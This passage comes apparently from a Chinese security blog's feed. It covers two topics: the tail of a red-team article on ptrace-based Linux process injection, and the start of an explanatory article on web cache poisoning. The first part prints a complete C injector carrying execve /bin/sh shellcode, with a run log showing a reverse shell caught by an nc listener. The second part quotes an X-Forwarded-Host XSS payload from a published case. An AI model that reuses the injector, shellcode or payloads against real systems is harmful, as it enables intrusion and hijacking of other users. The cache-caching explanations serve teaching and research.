class="string">&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">inject_data</span> <span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">unsigned</span> <span class="keyword">char</span> *src, <span class="keyword">void</span> *dst, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span>      i;</span><br><span class="line">  <span class="keyword">uint32_t</span> *s = (<span class="keyword">uint32_t</span> *) src;</span><br><span class="line">  <span class="keyword">uint32_t</span> *d = (<span class="keyword">uint32_t</span> *) dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i+=<span class="number">4</span>, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(POKETEXT):&quot;</span>);</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span>                   target;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="keyword">int</span>                     syscall;</span><br><span class="line">  <span class="keyword">long</span>                    dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage:\n\t%s pid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Tracing process %d\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_ATTACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(ATTACH):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Waiting for process...\n&quot;</span>);</span><br><span class="line">  wait (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Getting Registers\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_GETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inject code into current RPI position */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Injecting shell code at %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line">  inject_data (target, shellcode, (<span class="keyword">void</span>*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line"></span><br><span class="line">  regs.rip += <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Setting instruction pointer to %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_SETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Run it!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_DETACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(DETACH):&quot;</span>);</span><br><span class="line">	  <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译代码:</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">gcc infect.<span class="keyword">c</span> -o infect</span><br></pre></td></tr></table></figure>

<p>移动到容器：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">docker cp infect test:<span class="regexp">/root/</span></span><br></pre></td></tr></table></figure>

<p>攻击机监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>靶机宿主机启动一个python server进程</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -m SimpleHTTPServer <span class="number">55555</span></span><br></pre></td></tr></table></figure>

<p>查看python server进程:7365</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  poc docker cp infect <span class="built_in">test</span>:/root/</span><br><span class="line">➜  poc docker <span class="built_in">exec</span> -it <span class="built_in">test</span> /bin/bash</span><br><span class="line">root@f147ae171646:/<span class="comment"># ps -ef | grep 5555</span></span><br><span class="line">root      15260   7462  0 11:44 ?        00:00:00 python3 -m http.server 55555</span><br><span class="line">root      15262  15233  0 11:45 pts/1    00:00:00 grep --color=auto 5555</span><br><span class="line">root@f147ae171646:/<span class="comment"># /root/infect 15260</span></span><br><span class="line">+ Tracing process 15260</span><br><span class="line">+ Waiting <span class="keyword">for</span> process...</span><br><span class="line">+ Getting Registers</span><br><span class="line">+ Injecting shell code at 0x7fdb32ef77e4</span><br><span class="line">+ Setting instruction pointer to 0x7fdb32ef77e6</span><br><span class="line">+ Run it!</span><br><span class="line">root@f147ae171646:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p> 结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:37440.</span><br><span class="line">ifconfig</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.16.42.151  netmask 255.255.255.0  broadcast 172.16.42.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe01:f943  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:01:f9:43  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 206535  bytes 221632693 (211.3 MiB)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>测试动态链接库进行容器逃逸没有成功。可能是不能将容器里的so文件注入到宿主机的进程靶。</p>
<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>本文先使用动态链接库进行了进程注入，这种方式比较隐蔽，然后使用shellcode注入进程，两者的原理都是通过ptrace来实现的。shellcode的代码是单线程的所以会导致进程阻塞，也许可以加以改造，本人c代码能力有限，暂时不尝试。后续也许会添加用go实现的版本。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://payloads.online/archivers/2020-01-01/2/">https://payloads.online/archivers/2020-01-01/2/</a></li>
<li><a href="https://www.52coder.net/post/ld-preload">https://www.52coder.net/post/ld-preload</a></li>
<li><a href="https://payloads.online/archivers/2020-01-01/1/">https://payloads.online/archivers/2020-01-01/1/</a></li>
</ul>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title>web缓存投毒攻击全解</title>
    <url>/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E5%85%A8%E8%A7%A3/</url>
    <content><![CDATA[<blockquote>
<p>上善若水。水善利万物而不争，处众人之所恶，故几于道。</p>
</blockquote>
<p>web cache poisoning(web缓存投毒攻击) 一直是一种理论上的漏洞，James Kettle的研究将理论带入到实践。web缓存投毒攻击因James Kettle在black hat 2018 和black hat 2020关于缓存投毒的演讲而知名</p>
<p>本篇文章结合了James Kettle及其他人员关于 web cache poisoning 的研究成果，并结合案例及靶机进行讲解。</p>
<span id="more"></span>

<h2 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1. 基础概念"></a>1. 基础概念</h2><h3 id="1-1-web-缓存"><a href="#1-1-web-缓存" class="headerlink" title="1.1 web 缓存"></a>1.1 web 缓存</h3><p>web缓存在网络世界中无处不在，处于client 和 server之间，保存着某些响应的副本，当下次请求同一个资源的时候，缓存会将响应直接返回给client，而不用再去请求server。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210109150534753.png" alt="image-20210109150534753"></p>
<p>缓存存在的目的就是提升网页加载速度、减少server的负载。有些公司可能会使用类似Varnish的软件来建自己的缓存，但更多的会选择使用其他厂商的CDN服务，比如Cloudflare。随着CDN的流行，许多web应用程序或框架已经内部集成了缓存的功能，比如Drupal。除了web缓存外，还有其他类型的缓存，比如浏览器缓存、DNS缓存等，但这些不在本次讨论的范围中。</p>
<h3 id="1-2-不同种类的缓存"><a href="#1-2-不同种类的缓存" class="headerlink" title="1.2 不同种类的缓存"></a>1.2 不同种类的缓存</h3><p><strong>1. 数据库缓存</strong></p>
<p>有的web应用，数据表繁多，如果频繁进行数据库查询，很容易导致数据库不堪重负。为了提高查询的性能，会将查询后的数据放到内存中进行缓存，下次查询时，直接从内存缓存返回，提高响应效率，常用的缓存方案有memcached、redis等。</p>
<p><strong>2. 服务端缓存（本文的攻击目标就是服务端缓存）</strong></p>
<p>服务端缓存包含代理服务器缓存和CDN缓存，也就是我们的攻击目标，如果是浏览器缓存攻击不在本文讨论范围之内</p>
<p>1）代理服务器缓存</p>
<p>代理服务器是浏览器和源服务器的中间服务器，浏览器先向这个中间服务器发起Web请求，经过处理后（比如权限验证，缓存匹配等），再将请求转发到源服务器。</p>
<p>2）CDN缓存</p>
<p>CDN(Content delivery networks)缓存，也叫网关缓存、反向代理缓存。浏览器先向CDN网关发起Web请求，网关服务器后面对应着一台或多台负载均衡服务器，会根据它们的负载请求，动态将请求转发到合适的服务器上。</p>
<p><strong>3. 浏览器端缓存</strong></p>
<p>浏览器缓存(Browser Caching) 是浏览器端保存数据用于快速读取或避免重复资源请求的优化机制，有效的缓存使用可以避免重复的网络请求和浏览器快速地读取本地数据，整体上加速网页展示给用户。</p>
<p><strong>4. Web应用层缓存</strong></p>
<p>应用层缓存指的是从代码层面上，通过代码逻辑和缓存策略，实现对数据，页面，图片等资源的缓存，可以根据实际情况选择将数据存在文件系统或者内存中，减少数据库查询或者读写瓶颈，提高响应效率。</p>
<p>web应用缓存。</p>
<h3 id="1-3-HTTP协议如何控制web缓存"><a href="#1-3-HTTP协议如何控制web缓存" class="headerlink" title="1.3 HTTP协议如何控制web缓存"></a>1.3 HTTP协议如何控制web缓存</h3><p>如果是服务端代理的形式，发起http请求时候，会遇到三种情况</p>
<ul>
<li><p>无缓存标识/无缓存结果，直接请求服务器</p>
<img src="../images/pics/web缓存投毒攻击/image-20210218101505225.png" alt="image-20210218101505225" style="zoom:50%;" /></li>
<li><p>存在缓存结果和缓存标识，但结果失效，使用协商缓存。有两种情况</p>
<ol>
<li><p>协商后内容没有更新</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222164524255.png" alt="image-20210222164524255"></p>
</li>
<li><p>协商后内容更新</p>
<img src="../images/pics/web缓存投毒攻击/image-20210218131218339.png" alt="image-20210218131218339" style="zoom:50%;" /></li>
</ol>
</li>
<li><p>存在该缓存结果和缓存标识，且该结果尚未失效，强制缓存生效，直接返回该结果</p>
</li>
</ul>
<p>​       <img src="../images/pics/web缓存投毒攻击/image-20210218131321294.png" alt="image-20210218131321294" style="zoom:50%;" /></p>
<p><strong>http协议控制缓存在两种方式，分为强制缓存和协商缓存。</strong></p>
<h4 id="1-强制缓存"><a href="#1-强制缓存" class="headerlink" title="1. 强制缓存"></a>1. 强制缓存</h4><p>强制缓存由expires和cache-control控制，expire是HTTP1.0控制缓存的字段，而cache-control是http1.1控制缓存的字段，当两个同时存在时，cache-control优先</p>
<p><strong>Expires：</strong></p>
<p>Expires的值为缓存到期时间，即再次发起该请求时，如果客户端的时间小于Expires 的值时，直接使用缓存结果。Expires判断是否使用缓存的依据是比对客户端与服务端的相对时间，这就存在一个问题，如果客户端自己修改了一个时间，那么服务端定义的过期时间就毫无意义。所以后面HTTP1.1的cache-control使用了绝对时间来解决这个问题。</p>
<p><strong>Cache-Control</strong></p>
<p>在 <code>HTTP/1.1</code> 中，<code>Cache-Control</code> 是最重要的规则，主要用于控制网页缓存，主要取值为：</p>
<ul>
<li><code>public</code>：所有内容都将被缓存（客户端和代理服务器都可缓存）。</li>
<li><code>private</code>：所有内容只有客户端可以缓存，<code>Cache-Control</code> 的默认取值。</li>
<li><code>no-cache</code>：客户端缓存内容，但是是否使用缓存则需要经过协商缓存来验证决定。</li>
<li><code>no-store</code>：所有内容都不会被缓存。</li>
<li><code> max-age=xxx (xxx is numeric)</code>：缓存内容将在 <code>xxx</code> 秒后失效。</li>
<li><code>must-revalidate</code>: 使用一个过期资源需要和服务端协商</li>
</ul>
<p>如下图是某个请求的返回包内容里面有，max-age和expires同时存在，这种情况使用max-age。</p>
 <img src="../images/pics/web缓存投毒攻击/image-20210218094112468.png" alt="image-20210218094112468" style="zoom:50%;" />



<h4 id="2-协商缓存"><a href="#2-协商缓存" class="headerlink" title="2. 协商缓存"></a>2. 协商缓存</h4><p><strong>Last-Modified/If-Modified-Since</strong></p>
<p>1） Last-Modified</p>
<p>标示这个资源的最后修改时间，web服务器在响应请求时，告诉浏览器资源的最后修改时间。</p>
<p>2）If-Modified-Since</p>
<p>当资源过期时（使用cache-control标识的max-age)，发现资源具有Last-Modified声明，则再次向web服务器请求时带上头if-Modified-Since标识，与被请求资源的最后修改时间进行比对，若最后修改时间较新，说明资源被改动过，则响应整片资源内容（写在响应消息包体内），HTTP 200；若最后修改时间较旧，说明资源无新修改，则响应HTTP 304 (无需包体，节省带宽)，告知浏览器继续使用所保存的cache。</p>
<p>我们看一个真实的例子，有一个请求如下</p>
<pre>GET /synthesislink/5651.html HTTP/1.1
Host: evt.example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Cookie: _hc.v=3bb63beb-3ffc-8a6e-2582-88889c8cf324.1612693648; _lxsdk_cuid=177b98e84b1c8-01596ea0d5b2a-44596b-13c680-177b98e84b1c8; _lxsdk=177b98e84b1c8-01596ea0d5b2a-44596b-13c680-177b98e84b1c8
Upgrade-Insecure-Requests: 1
<font color="red">If-Modified-Since: Tue, 19 Mar 2019 23:59:20 GMT</font>
If-None-Match: "b14f1aaaae22302e7ab07e44a2990ac9"</pre>


<p>响应为：</p>
<pre>HTTP/1.1 <font color="red">304 Not Modified</font>
Server: NWS_TCloud_S2
Connection: close
Date: Mon, 22 Feb 2021 08:29:54 GMT
Cache-Control: max-age=300
Expires: Mon, 22 Feb 2021 08:34:54 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 0
X-NWS-LOG-UUID: 1089614981990302347 9fc91eb65c4db73a1ff8259ab718718d
X-Via: DIANXIN-JIANGSU_31(304:refresh_hit);DIANXIN-JIANGSU_30(304:ims_hit)
X-Daa-Tunnel: hop_count=1</pre>


<p>观察响应，X-NWS-LOG-UUID是腾讯的CDN节点（<a href="https://segmentfault.com/a/1190000006673084">各厂商CDN节点</a>），并且有过期时间<code>Expires: Mon, 22 Feb 2021 08:34:54 GMT</code> 。由这些信息可知，这是一个CND web缓存。观察请求，<code>If-Modified-Since: Tue, 19 Mar 2019 23:59:20 GMT</code>还是2019年的。说明Last-Modified是一个很早的时间，只有If-Modified-Since比Last-Modified时间早才会返回304，所以我们修改一个更早的时间，</p>
<pre>GET /synthesislink/5651.html HTTP/1.1
Host: evt.example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Cookie: _hc.v=3bb63beb-3ffc-8a6e-2582-88889c8cf324.1612693648; _lxsdk_cuid=177b98e84b1c8-01596ea0d5b2a-44596b-13c680-177b98e84b1c8; _lxsdk=177b98e84b1c8-01596ea0d5b2a-44596b-13c680-177b98e84b1c8
Upgrade-Insecure-Requests: 1
<font color="red">If-Modified-Since: Tue, 19 Mar 2021 23:59:20 GMT</font>
If-None-Match: "b14f1aaaae22302e7ab07e44a2990ac9"</pre>



<pre>HTTP/1.1 200 OK
Server: NWS_TCloud_static_msoc2
Connection: close
Date: Mon, 22 Feb 2021 08:46:54 GMT
Cache-Control: max-age=300
Expires: Mon, 22 Feb 2021 08:51:54 GMT
<font color="red">Last-Modified: Tue, 19 Mar 2019 23:59:20 GMT</font>
Content-Type: text/html;charset=utf-8
Content-Length: 20774
X-NWS-UUID-VERIFY: 29a5326de1ddd86a7ec8ed63875a0b94
X-NWS-LOG-UUID: 9138859087622259624 5476affaca7698add4248c29c918eb79
X-Cache-Lookup: Hit From Disktank3
Keep-Alive: timeout=5
Accept-Ranges: bytes
ETag: "b14f1aaaae22302e7ab07e44a2990ac9"
X-Amz-Id-2: adee119763fb198799edc98469117b30
X-Amz-Request-Id: 1613955595686967
X-Mss-Trace-Id: 5209824156916383142
X-Route-Trace-Id: 5293343060162248102
x-amz-storage-class: STANDARD
Access-Control-Allow-Origin: *
X-Daa-Tunnel: hop_count=3
X-Cache-Lookup: Hit From Inner Cluster
X-Via: DIANXIN-SHANDONG_144(200:miss);DIANXIN-SHANDONG_166(200:refresh_miss)
X-Cache-Lookup: Hit From Upstream
X-Cache-Lookup: Hit From Inner Cluster</pre>




<p>观察上面两个请求包，可以知道通过修改<code>If-Modified-Since</code>刷新了缓存，在响应中也出现了时间Last-Modified的值为2019年的日期，印证了我们的猜想。这个例子也说明通过Last-Modified/If-Modified-Since控制缓存是没有什么意义的，可以对其篡改。</p>
<p><strong>Etag/If-None-Match</strong></p>
<p>Etag/If-None-Match也要配合Cache-Control使用。</p>
<p>1）etag: </p>
<p>web服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器决定）。Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。</p>
<p>2）If-None-Match：</p>
<p>当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etage声明，则再次向web服务器请求时带上头If-None-Match （Etag的值）。web服务器收到请求后发现有头If-None-Match 则与被请求资源的相应校验串进行比对，决定返回200或304。</p>
<p><strong>4. 既生Last-Modified何生Etag</strong></p>
<p>既然使用Last-Modified能够知道资源是否足够新，为什么还需要Etag（实体标识）呢？主要解决如下几个问题。</p>
<p>1） Last-Modified标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间。</p>
<p>2）如果某些文件会被定期生成，当有时内容并没有任何变化，但Last-Modified却改变了，导致文件没法使用缓存。</p>
<p>3）有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。</p>
<p>Etag是服务器自动生成或者由开发者生成的对应资源在服务器端的唯一标识符，能够更加准确的控制缓存。Last-Modified与ETag是可以一起使用的，服务器会优先验证ETag，一致的情况下，才会继续比对Last-Modified，最后才决定是否返回304。</p>
<p>如下图etag和last-modified同时存在，优先使用etag。</p>
 <img src="../images/pics/web缓存投毒攻击/image-20210218134240191.png" alt="image-20210218134240191" style="zoom:50%;" />







<h3 id="1-4-cache-key"><a href="#1-4-cache-key" class="headerlink" title="1.4 cache key"></a>1.4 cache key</h3><p>当缓存收到一个请求，它需要判断是否存有该请求的响应，如果有就直接返回，没有就将该请求转发到服务器。</p>
<p>缓存为了确定本次请求的响应是否存在，它需要拿本次请求和之前保留的做匹配，如果匹配上就说明存有响应。匹配时如果一个字节一个字节的比较效率会很低，因为HTTP请求充斥着对于cache来说无关紧要的信息，比如User-Agent。</p>
<p>为了解决这个问题，提出了cache key的概念。cache key就是用来使用http请求的其中几个元素来确认这个资源之前被请求过。</p>
<pre>GET <font color="red">/blog/post.php?mobile=1</font> HTTP/1.1
Host: <font color="red">example.com</font>
User-Agent: Mozilla/5.0 … Firefox/57.0
Accept: */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://google.com/
Cookie: jessionid=xyz;
Connection: close</pre>


<p>比如上面的请求包的 cache key 就是:</p>
<pre>    Cache Key: https|GET|example.com|/blog/post.php?mobile=1</pre>

<p>大多数cache key是host和路由，但这并不是绝对的。</p>
<p>如果一个非cache key的缓存资源被污染了，那么后续用户访问同一个cache key的资源会被影响。</p>
<p>如下两个请求对于cache来说是一样的，请求1的响应会是请求2的响应。</p>
<p>请求1:</p>
<pre>GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=<font color="red">pl</font>;
Connection: close</pre>


<p>请求2:</p>
<pre>GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=<font color=red>en</font>;
Connection: close
</pre>



<p>结果就是发起第二个请求的人会收到错误的语言。这就是问题所在，任何一个不存在于 cache key的不同输入都有可能作为response存在于cache中，然后返回给其他用户。理论上网站可以使用响应头的’Vary’字段来制定将什么内容加入到 cache key ，比如加入<code>Vary: Cookie</code>那么缓存服务器就会比对Cookie是否也一样，上述两个请求肯定不一样，所以缓存服务器不会直接返回之前存储的内容，而是转发给服务器。但实际上，响应头的’Vary’基本都会被开发者忽略，像Cloudflare这种CDN厂商完全忽略’Vary’</p>
<h3 id="1-5-unkeyed"><a href="#1-5-unkeyed" class="headerlink" title="1.5 unkeyed"></a>1.5 unkeyed</h3><p>unkeyed在本文中就是指不属于cache key，但是这个unkeyed值可能导致一些危害的参数或者HTTP头。</p>
<h3 id="1-6-缓存投毒"><a href="#1-6-缓存投毒" class="headerlink" title="1.6 缓存投毒"></a>1.6 缓存投毒</h3><p>缓存投毒的攻击理念就是发起一个能导致有害响应的请求，让cache保存此响应，然后提供给其他用户。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210106201009322.png" alt="image-20210106201009322"></p>
<p>本文主要讨论使用未加入 cache key的HTTP请求头的投毒方式，当然不止这一种，其他方式比如请求http 请求拆分、请求走私。其他方式将在后续的文章进行分享。类似的有一种<a href="https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html">web缓存欺骗</a>的攻击方式，不要混淆了这两种攻击方式，后续有机会可以分享一下这种攻击方式。</p>
<h3 id="1-7-缓存投毒的影响"><a href="#1-7-缓存投毒的影响" class="headerlink" title="1.7 缓存投毒的影响"></a>1.7 缓存投毒的影响</h3><p>缓存投毒的影响严重依赖以下两个重要因素。</p>
<ul>
<li>缓存投毒攻击的影响程度取决于注入的payload，和大多数攻击方式一样，缓存投毒需要和其他漏洞组合起来以提升危害性。</li>
<li>访问量。因为缓存投毒的攻击目标是投毒后的资源访问群体，所以访问的人越多就危害越大。</li>
</ul>
<h3 id="1-8-如何进行一个缓存投毒漏洞的挖掘"><a href="#1-8-如何进行一个缓存投毒漏洞的挖掘" class="headerlink" title="1.8 如何进行一个缓存投毒漏洞的挖掘"></a>1.8 如何进行一个缓存投毒漏洞的挖掘</h3><p>总的来说，挖掘一个缓存投毒漏洞的步骤如下：</p>
<p><strong>1. 确认unkeyed</strong></p>
<p>第一步就是确认没有被纳入cache key的http请求头，通常是找参数或者请求头回显点能否和缓存关联，手工来检测是一项非常乏味的工作，因此作者开发了一款叫 Param Miner的 Burp Suite插件来自动挖掘。但是我在实际使用过程中效果很一般，找一些常见的请求头回显还是有点用的。</p>
<p><strong>2. 构造利用手段</strong></p>
<p>在找到unkeyed后，就是判断判断是否能够造成危害，通常的方法是结合xss等漏洞。</p>
<h2 id="2-不同的攻击方式"><a href="#2-不同的攻击方式" class="headerlink" title="2. 不同的攻击方式"></a>2. 不同的攻击方式</h2><p>让我们看看作者讲的一些真实案例。通常，测试这些站点都是点到为止，不会对站点造成影响。由于这些站点都是公开站点，所以不可避免要修改一些内容。</p>
<h3 id="2-1-redhat的一个投毒案例"><a href="#2-1-redhat的一个投毒案例" class="headerlink" title="2.1 redhat的一个投毒案例"></a>2.1 redhat的一个投毒案例</h3><p>主页中，<code>X-Forwarded-Host: canary</code>出现在了meta标签中。这里<code>X-Forwarded-Host: canary</code>就是unkeyed</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/en?cb=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.redhat.com</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>canary</span><br><span class="line"></span><br><span class="line"><span class="lasso">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span></span><br><span class="line"><span class="lasso"><span class="keyword">Cache</span><span class="params">-Control</span>: <span class="keyword">public</span>, no<span class="params">-cache</span></span></span><br><span class="line"><span class="lasso">…</span></span><br><span class="line"><span class="lasso">&lt;meta property=<span class="string">&quot;og:image&quot;</span> content=<span class="string">&quot;https://canary/cms/social.png&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了不影响其他用户，这里作者找到一个可以自己定义参数的页面，添加xss的poc。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/en?dontpoisoneveryone=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.redhat.com</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>a.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="xml">Cache-Control: public, no-cache</span></span><br><span class="line"><span class="xml">…</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">property</span>=<span class="string">&quot;og:image&quot;</span> <span class="attr">content</span>=<span class="string">&quot;https://a.&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;/&gt; </span></span><br></pre></td></tr></table></figure>

<p>成功触发了POC。但是这只是一个self xss，是没有什么危害性。但是如果存在缓存投毒，就可以将XSS存储到缓存中，之后访问的用户就会触发XSS。从而攻击到其他用户。</p>
<h3 id="2-2-投毒时机"><a href="#2-2-投毒时机" class="headerlink" title="2.2 投毒时机"></a>2.2 投毒时机</h3><p>对于上面的例子，如果我们要对主页进行真的投毒攻击，我们可能会选择使用Burp Intruder模块进行持续性投毒，因为我们不知道缓存在什么时候过期，并且要在它刚好过期的时候投毒成功。如果持续发送大量数据包，可能会引起注意，这会让投毒攻击变得困难，当然，可以通过对缓存系统进行逆向、查看文档和监控等手段来预测到期时间，但是这听起来就是一项艰苦的任务，有时候往往比这简单。</p>
<p>看下面的例子</p>
